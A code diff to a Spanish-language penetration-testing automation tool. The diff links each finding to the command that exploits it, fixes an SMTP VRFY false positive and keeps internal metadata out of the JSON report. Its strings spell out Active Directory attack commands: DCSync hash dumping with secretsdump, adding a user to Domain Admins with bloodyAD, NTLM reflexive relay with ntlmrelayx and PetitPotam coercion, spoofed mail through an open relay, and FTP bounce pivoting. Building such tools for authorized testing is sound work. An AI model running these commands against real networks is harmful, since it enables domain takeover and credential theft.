@@ -1698,6 +1698,25 @@ def _step(res, cmd, ok, output, note=""):
                          "output": sanitize(output or "")[:8000], "note": note})
 
 
+def _attach_cmd(res, finding_text, cmds):
+    """Vincula EXPLÍCITAMENTE el/los next-step(s) que explotan ESTE hallazgo, para que
+    quick_wins enseñe el comando correcto y no "los primeros N del pool" — que mezcla pasos de
+    otros hallazgos (p. ej. AS-REP/Kerberoast anónimos encabezando el pool) y producía la
+    asociación errónea que reportó el operador (un ACL crítico 'FullControl sobre Domain Admins'
+    mostraba GetNPUsers/GetUserSPNs en vez del 'bloodyAD add groupMember'). El texto del hallazgo
+    (clave de búsqueda en quick_wins) debe ser EXACTAMENTE el que se añadió a res['findings'].
+    La metadata vive en la clave interna '_cmd_for' (prefijo '_' → write_reports no la serializa a
+    findings.json). Los comandos se añaden además a res['next'] si no estaban, para que sigan
+    apareciendo en la sección completa del protocolo. Puro → testeable sin red."""
+    cmds = [c for c in cmds if c]
+    if not cmds:
+        return
+    res.setdefault("_cmd_for", {})[finding_text] = cmds
+    for c in cmds:
+        if c not in res["next"]:
+            res["next"].append(c)
+
+
 def classify(p):
     """Protocolo canónico de un puerto/servicio, o None si no hay footprint propio."""
     n = (p["name"] or "").lower()
@@ -1929,9 +1948,12 @@ def fp_ftp(ip, ports, services, host, deep):
         _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap con sus scripts NSE para este servicio")
         if "bounce" in lbl and re.search(r"bounce working|succeeded", txt, re.I):
             bport = ports[0]["port"] if ports else 21
-            res["findings"].append(("alta",
+            _bounce_txt = (
                 f"FTP {bport}: FTP bounce ACTIVO (el servidor permite PORT a terceros) — se puede escanear/pivotar "
-                f"a la red interna a través de él: nmap -Pn -b anonymous:anonymous@{ip}:{bport} <IP-interna>"))
+                f"a la red interna a través de él: nmap -Pn -b anonymous:anonymous@{ip}:{bport} <IP-interna>")
+            res["findings"].append(("alta", _bounce_txt))
+            _attach_cmd(res, _bounce_txt, [
+                f"nmap -Pn -b anonymous:anonymous@{ip}:{bport} <IP-interna>   # escaneo/pivot por FTP bounce a la red interna"])
     return res
 
 
@@ -3332,9 +3354,15 @@ def fp_smtp(ip, ports, services, host, deep, domains=(), extra_domain=None):
             except smtplib.SMTPException:
                 srv.close()
             _step(res, f"smtplib: EHLO + VRFY root @{ip}:{port}", True, "\n".join(body))
-            if vcode in (250, 252):
+            if vcode == 250:
                 res["findings"].append(("media", f"SMTP {port}: VRFY habilitado (enumeración de usuarios posible)"))
                 res["next"].append(f"smtp-user-enum -M VRFY -U users.txt -t {ip} -w 15 -v")
+            elif vcode == 252:
+                # 252 = "Cannot VRFY user, but will accept message and attempt delivery": respuesta
+                # NO-comprometida — el servidor contesta lo MISMO para usuarios válidos e inexistentes
+                # (Exchange y muchos Postfix), así que VRFY NO sirve para enumerar. Marcarlo como
+                # "habilitado" y sugerir el escaneo VRFY era un falso positivo (el escaneo no saca nada).
+                res["findings"].append(("info", f"SMTP {port}: VRFY responde 252 (no-comprometido) — no sirve para enumerar usuarios"))
         except (smtplib.SMTPException, OSError) as e:
             _step(res, f"smtplib: EHLO @{ip}:{port}", False, f"error: {e}")
     # Enumeración de usuarios por RCPT (smtp-user-enum): solo con --aggressive y un dominio
@@ -3372,7 +3400,12 @@ def fp_smtp(ip, ports, services, host, deep, domains=(), extra_domain=None):
         if _smtp_is_open_relay(txt):   # solo el positivo real; dedup (varios puertos SMTP) con el flag
             relay = True
     if relay:
-        res["findings"].append(("alta", "SMTP: open relay confirmado por nmap (smtp-open-relay) — reenvía correo sin autenticar (phishing/spoofing con swaks)"))
+        _relay_txt = "SMTP: open relay confirmado por nmap (smtp-open-relay) — reenvía correo sin autenticar (phishing/spoofing con swaks)"
+        res["findings"].append(("alta", _relay_txt))
+        eport = 25 if any(p["port"] == 25 for p in ports) else (ports[0]["port"] if ports else 25)
+        _attach_cmd(res, _relay_txt, [
+            f"swaks --to victima@objetivo.com --from spoof@confianza.com --server {ip}:{eport} "
+            "--header 'Subject: test' --body 'prueba de open relay'   # confirma/abusa del relay abierto"])
     return res
 
 
@@ -6780,12 +6813,12 @@ def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_a
           _daclread_has_ace(out), _m(out),
           note="¿esta credencial tiene DS-Replication-Get-Changes[-All] sobre el dominio? → DCSync viable YA "
                "(volcar todos los hashes sin ser admin)")
-    if _daclread_has_ace(out) and _add_once(res, "critica",
-            f"AD (cred {u}): DCSync viable — «{u}» tiene DS-Replication-Get-Changes-All sobre el dominio → "
-            "volcar TODOS los hashes del dominio (krbtgt incluido) sin ser Domain Admin", "DCSync viable", seen):
-        res["next"].append(
+    _dcsync_txt = (f"AD (cred {u}): DCSync viable — «{u}» tiene DS-Replication-Get-Changes-All sobre el dominio → "
+                   "volcar TODOS los hashes del dominio (krbtgt incluido) sin ser Domain Admin")
+    if _daclread_has_ace(out) and _add_once(res, "critica", _dcsync_txt, "DCSync viable", seen):
+        _attach_cmd(res, _dcsync_txt, [
             f"impacket-secretsdump -just-dc {domain}/{shlex.quote(u)}:***@{ip}   # DCSync confirmado arriba: "
-            "vuelca el NTDS entero (añade '-just-dc-user krbtgt' para solo la krbtgt → Golden Ticket)")
+            "vuelca el NTDS entero (añade '-just-dc-user krbtgt' para solo la krbtgt → Golden Ticket)"])
     # 2) Control abusable sobre grupos de alto valor
     for grp in _ACL_HV_GROUPS:
         rc, out = _dacl([f"TARGET={grp}", f"PRINCIPAL={u}", "ACTION=read"])
@@ -6793,11 +6826,10 @@ def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_a
         _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET={shlex.quote(grp)} PRINCIPAL={u}",
               bool(rights), _m(out),
               note=f"¿esta credencial tiene control abusable (GenericAll/WriteDACL/WriteOwner/…) sobre '{grp}'? → escalada directa a Domain Admin")
-        if rights and _add_once(res, "critica",
-                f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre '{grp}' → escalada DIRECTA a {grp} "
-                "(meterse en el grupo) — la ruta que normalmente hay que buscar con BloodHound a mano", f"ACL {grp}", seen):
-            for c in _acl_abuse_cmds(rights, grp, u, secret, is_hash, domain, ip):
-                res["next"].append(c)
+        _grp_txt = (f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre '{grp}' → escalada DIRECTA a {grp} "
+                    "(meterse en el grupo) — la ruta que normalmente hay que buscar con BloodHound a mano")
+        if rights and _add_once(res, "critica", _grp_txt, f"ACL {grp}", seen):
+            _attach_cmd(res, _grp_txt, _acl_abuse_cmds(rights, grp, u, secret, is_hash, domain, ip))
     # 3) Control abusable sobre CUENTAS de alto valor (no solo grupos): con control sobre la
     # propia cuenta 'Administrator' no hace falta meterte en ningún grupo, le reseteas la
     # contraseña y entras directamente como ella.
@@ -6808,12 +6840,10 @@ def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_a
               bool(rights), _m(out),
               note=f"¿esta credencial tiene control abusable (GenericAll/WriteDACL/WriteOwner/…) sobre la CUENTA "
                    f"'{acc}'? → resetarle la contraseña y entrar directamente como ella, sin pasar por ningún grupo")
-        if rights and _add_once(res, "critica",
-                f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre la cuenta '{acc}' → resetear su "
-                "contraseña DIRECTAMENTE y entrar como ella (no hace falta meterse en ningún grupo)",
-                f"ACL cuenta {acc}", seen):
-            for c in _acl_abuse_cmds(rights, acc, u, secret, is_hash, domain, ip, kind="account"):
-                res["next"].append(c)
+        _acc_txt = (f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre la cuenta '{acc}' → resetear su "
+                    "contraseña DIRECTAMENTE y entrar como ella (no hace falta meterse en ningún grupo)")
+        if rights and _add_once(res, "critica", _acc_txt, f"ACL cuenta {acc}", seen):
+            _attach_cmd(res, _acc_txt, _acl_abuse_cmds(rights, acc, u, secret, is_hash, domain, ip, kind="account"))
 
 
 def _parse_nxc_userlist(out):
@@ -8979,7 +9009,14 @@ def _tip_for(finding_text):
 # ESE hallazgo en concreto, no uno cualquiera de los próximos pasos del footprint — ver _cmds_for.
 _STRONG_KW_RE = re.compile(
     r"CVE-\d{4}-\d{4,}|MS\d{2}-\d{3}|Zerologon|noPac|PrinterBug|PetitPotam|DCSync|"
-    r"Kerberoast|AS-REP|LAPS|GPP|EternalBlue|AXFR|no_root_squash|SWEET32|BlueKeep", re.I)
+    r"Kerberoast|AS-REP|LAPS|GPP|EternalBlue|AXFR|no_root_squash|SWEET32|BlueKeep|"
+    # Abuso de ACL (derechos y grupos de alto valor) y relay: tokens DISTINTIVOS que aparecen
+    # TANTO en el hallazgo COMO en su comando de abuso (bloodyAD add groupMember 'Domain
+    # Admins' …, ntlmrelayx … relay REFLEXIVO), para que _cmds_for los empareje aunque no haya
+    # _cmd_for explícito. Se evitan a propósito tokens de alta colisión ('Self', 'Administrator',
+    # 'Administrators') que casarían con hallazgos/comandos no relacionados.
+    r"GenericAll|FullControl|WriteDACL|WriteOwner|GenericWrite|WriteProperties|"
+    r"Domain Admins|Enterprise Admins|relay REFLEXIVO|open relay|FTP bounce", re.I)
 
 
 def _cmds_for(finding_text, next_steps, n=3):
@@ -9053,10 +9090,17 @@ def quick_wins(footprints, vulns=None):
         if not hot:
             continue
         next_pool = combined_next.get(id(fpr), fpr["next"])
+        cmd_for = fpr.get("_cmd_for", {})
         for s, t in hot:
             if _has_full_ad_users and re.match(r"^Kerberos: \d+ usuario\(s\) AD válidos por kerbrute", t):
                 continue
-            wins.append({"sev": s, "title": t, "cmds": _cmds_for(t, next_pool), "tip": _tip_for(t)})
+            # Si el hallazgo trae su comando vinculado en origen (_attach_cmd), ESE es el paso que
+            # lo explota — no "los primeros N del pool" (que mezcla pasos de otros hallazgos y
+            # producía la asociación errónea que reportó el operador). Si no, se cae al emparejado
+            # por CVE/nombre de ataque y, en último término, al orden original del footprint.
+            explicit = cmd_for.get(t)
+            cmds = list(explicit) if explicit else _cmds_for(t, next_pool)
+            wins.append({"sev": s, "title": t, "cmds": cmds, "tip": _tip_for(t)})
     for v in (vulns or []):
         if not v.get("known"):
             continue
@@ -9070,10 +9114,21 @@ def quick_wins(footprints, vulns=None):
     wins.sort(key=lambda w: SEV_ORDER.get(w["sev"], 9))
     # Dedup DESPUÉS de ordenar: un MISMO next-step se muestra una sola vez, en el win de MAYOR
     # severidad (p. ej. el bloodhound de la Fase 5d, común a varios hallazgos) — así la caja de
-    # quick wins no repite el mismo comando 6-7 veces seguidas.
+    # quick wins no repite el mismo comando 6-7 veces seguidas. Se compara el comando SIN su
+    # comentario inline ('cmd   # nota'): el MISMO comando emitido por dos footprints con
+    # comentarios distintos (p. ej. GetNPUsers desde SMB y desde LDAP, con '# AS-REP roast (con
+    # creds)' vs '# AS-REP roast (con credenciales válidas)') se consideraba distinto y salía
+    # DUPLICADO en el informe — justo lo que este dedup debía evitar.
     seen_cmds = set()
     for w in wins:
-        w["cmds"] = [c for c in w["cmds"] if not (c in seen_cmds or seen_cmds.add(c))]
+        kept = []
+        for c in w["cmds"]:
+            key = c.split("   #", 1)[0].rstrip()
+            if key in seen_cmds:
+                continue
+            seen_cmds.add(key)
+            kept.append(c)
+        w["cmds"] = kept
     return wins
 
 
@@ -9910,7 +9965,14 @@ def write_reports(base, ip, services, host, footprints, vulns, domains, web_hits
             "ports": [{k: p[k] for k in ("port", "proto", "name", "product", "version",
                                          "extrainfo", "banner", "scripts")} for p in services],
             "host_scripts": host,
-            "footprints": footprints,
+            # Las claves internas con prefijo '_' (metadata transitoria: '_cmd_for' de
+            # _attach_cmd, '_ldap_signing_disabled' de nxc_auth, '_pending_kerbrute', etc.) NO se
+            # serializan a findings.json: no son parte del informe y antes se filtraban (p. ej.
+            # '_ldap_signing_disabled' aparecía en footprints[]). Los hallazgos/next derivados de
+            # esa metadata ya están materializados en 'findings'/'next', así que --resume no pierde
+            # nada. Se copia a dicts nuevos para no mutar los footprints vivos.
+            "footprints": [{k: v for k, v in fp.items() if not k.startswith("_")}
+                           for fp in footprints],
             "vulns": vulns or [],
             "findings": [{"sev": s, "text": t} for s, t in _all_findings(services, host, footprints, vulns)],
             "domains": domains_out, "web": {str(k): v for k, v in web_hits.items()}, "vhosts": vhosts,
@@ -13093,6 +13155,45 @@ def selftest():
     # sin la lista completa, el de kerbrute SÍ sale (es lo único que hay todavía)
     _qwk_only = quick_wins([_qwk_kerb])
     assert len(_qwk_only) == 1 and "57 usuario" in _qwk_only[0]["title"], _qwk_only
+
+    # ── Asociación hallazgo→comando (bug #1 reportado en vivo por el operador) ──────────────────
+    # Un hallazgo con su comando VINCULADO en origen (_attach_cmd → _cmd_for) muestra ESE comando
+    # en quick_wins, NUNCA 'los primeros N del pool' (que encabezan los roasting AS-REP/Kerberoast
+    # anónimos). Caso real: el ACL crítico «FullControl/WriteDACL sobre 'Domain Admins'» mostraba
+    # GetNPUsers/GetUserSPNs en vez del 'bloodyAD add groupMember'. El fixture mete los roasting
+    # ANTES en el pool a propósito: sin el fix, el win cae a ellos; con el fix, al bloodyAD.
+    _acl_txt = ("AD (cred CT059): «CT059» tiene FullControl, WriteDACL sobre 'Domain Admins' → "
+                "escalada DIRECTA a Domain Admins (meterse en el grupo)")
+    _acl_fp = {"proto": "reuse-ldap", "title": "x", "ports": [389], "steps": [],
+               "findings": [("critica", _acl_txt)],
+               "next": ["impacket-GetNPUsers dom/U:P -request -dc-ip 1.2.3.4   # AS-REP roast",
+                        "impacket-GetUserSPNs dom/U:P -request -dc-ip 1.2.3.4   # Kerberoast"],
+               "missing": []}
+    _attach_cmd(_acl_fp, _acl_txt,
+                ["bloodyAD --host 1.2.3.4 -d dom -u CT059 -p '***' add groupMember 'Domain Admins' CT059   # te metes en el grupo"])
+    _acl_qw = quick_wins([_acl_fp])
+    assert _acl_qw and "bloodyAD" in _acl_qw[0]["cmds"][0], _acl_qw
+    assert not any("GetNPUsers" in c or "GetUserSPNs" in c for c in _acl_qw[0]["cmds"]), _acl_qw
+    # _attach_cmd añade el comando a res['next'] si no estaba (sigue en la sección completa) y lo
+    # guarda en la clave INTERNA '_cmd_for' (prefijo '_'), no en una clave pública.
+    assert any("bloodyAD" in n for n in _acl_fp["next"]) and "_cmd_for" in _acl_fp
+    # Defensa en profundidad: aunque NO haya _cmd_for, _STRONG_KW_RE ahora empareja por derecho de
+    # ACL / grupo de alto valor (tokens distintivos presentes en hallazgo Y comando).
+    assert _cmds_for("… GenericAll sobre 'Domain Admins' …",
+                     ["impacket-GetNPUsers … # AS-REP",
+                      "bloodyAD … add groupMember 'Domain Admins' CT059"]) \
+        == ["bloodyAD … add groupMember 'Domain Admins' CT059"]
+    # Dedup de quick_wins compara el comando SIN su comentario inline ('cmd   # nota'): el MISMO
+    # comando emitido por dos footprints con comentarios distintos (GetNPUsers desde SMB y desde
+    # LDAP) ya no sale DUPLICADO (bug #68).
+    _d1 = {"proto": "smb", "title": "SMB", "ports": [445], "steps": [], "findings": [("critica", "F1")],
+           "next": [], "missing": []}
+    _attach_cmd(_d1, "F1", ["impacket-GetNPUsers dom/U:P -request -dc-ip 1.2.3.4   # AS-REP roast (con creds)"])
+    _d2 = {"proto": "ldap", "title": "LDAP", "ports": [389], "steps": [], "findings": [("alta", "F2")],
+           "next": [], "missing": []}
+    _attach_cmd(_d2, "F2", ["impacket-GetNPUsers dom/U:P -request -dc-ip 1.2.3.4   # AS-REP roast (con credenciales válidas)"])
+    _dup_cmds = [c for w in quick_wins([_d1, _d2]) for c in w["cmds"]]
+    assert len(_dup_cmds) == 1, _dup_cmds
     # _tip_for: "qué hacer A MANO" por categoría de hallazgo — pedido explícito para uso en
     # OSCP (nada de explotación automatizada). Puro, por coincidencia de texto; cada win de
     # quick_wins() lleva su "tip" ya resuelto (None si ninguna categoría aplica).
@@ -13545,6 +13646,28 @@ def selftest():
         globals()["build_html"] = _real_bh
     assert (_wr_dir / "findings.json").is_file()      # el JSON se escribió pese al fallo del HTML
     assert not (_wr_dir / "report.html").is_file()    # el HTML petó y se saltó, sin tumbar el resto
+
+    # write_reports NO serializa claves internas '_'-prefijadas en footprints[] de findings.json:
+    # metadata transitoria (_cmd_for de _attach_cmd, _ldap_signing_disabled de nxc_auth,
+    # _pending_kerbrute…) que antes se filtraba al JSON (bug #26: _ldap_signing_disabled aparecía
+    # en footprints[] del findings.json real). Lo PÚBLICO (findings/next/…) queda intacto y el
+    # footprint VIVO no se muta (se copia a un dict nuevo).
+    _ser_dir = Path(tempfile.mkdtemp())
+    _ser_fp = {"proto": "ldap", "title": "LDAP", "ports": [389], "steps": [],
+               "findings": [("info", "x")], "next": ["cmd A"], "missing": [],
+               "_ldap_signing_disabled": True, "_cmd_for": {"x": ["cmd A"]},
+               "_pending_kerbrute": {"ip": "1.2.3.4"}}
+    globals()["build_html"] = lambda *a, **k: None
+    try:
+        with _ctx.redirect_stdout(_io.StringIO()), _ctx.redirect_stderr(_io.StringIO()):
+            write_reports(_ser_dir, "1.2.3.4", _wr_svc, {}, [_ser_fp], [], [], {}, [], None,
+                          quiet=True, phases_done=[])
+    finally:
+        globals()["build_html"] = _real_bh
+    _ser_fp_out = json.loads((_ser_dir / "findings.json").read_text())["footprints"][0]
+    assert not any(k.startswith("_") for k in _ser_fp_out), list(_ser_fp_out)
+    assert _ser_fp_out["findings"] == [["info", "x"]] and _ser_fp_out["next"] == ["cmd A"]
+    assert "_cmd_for" in _ser_fp and "_ldap_signing_disabled" in _ser_fp   # el footprint vivo intacto
 
     # _phase_fail: una fase que peta se registra en error.log y NO re-lanza (el run sigue → hay informe final)
     _pf_dir = Path(tempfile.mkdtemp())
@@ -14835,17 +14958,18 @@ def _combine_relay_opportunity(footprints, ip):
     coerce_ok = rpc_fp.pop("_coerce", False) if rpc_fp else False
     coerce_via = rpc_fp.pop("_coerce_via", "") if rpc_fp else ""
     if smb_fp and signing_disabled and coerce_ok:
-        smb_fp["findings"].append(("critica",
+        _relay_txt = (
             f"SMB+MSRPC: relay REFLEXIVO viable — {coerce_via} expuesto (MSRPC) + SMB signing no "
             "requerido (arriba): coacciona al equipo a autenticarse contra tu listener y reenvía esa "
             "misma autenticación de vuelta a SU PROPIO SMB con ntlmrelayx → sesión autenticada como "
-            "la cuenta de MÁQUINA del equipo (a menudo admin local de sí misma)"))
-        smb_fp["next"].append(
+            "la cuenta de MÁQUINA del equipo (a menudo admin local de sí misma)")
+        smb_fp["findings"].append(("critica", _relay_txt))
+        _attach_cmd(smb_fp, _relay_txt, [
             f"ntlmrelayx.py -t smb://{ip} -smb2support   # EN PARALELO: coercer coerce -u USER -p PASS "
             f"-d DOMINIO --target-ip {ip} --listener-ip TU_IP (o petitpotam.py -u USER -p PASS -d "
             f"DOMINIO TU_IP {ip}) — relay REFLEXIVO ({coerce_via} + signing no requerido, ambos "
             "confirmados arriba): la autenticación forzada del equipo se reenvía de vuelta a su "
-            "propio SMB → sesión como cuenta de MÁQUINA (de ahí, secretsdump.py vía esa sesión)")
+            "propio SMB → sesión como cuenta de MÁQUINA (de ahí, secretsdump.py vía esa sesión)"])
 
 
 # Proto de cada fp_* → cómo llama brutespray a ESE MISMO servicio (confirmado contra
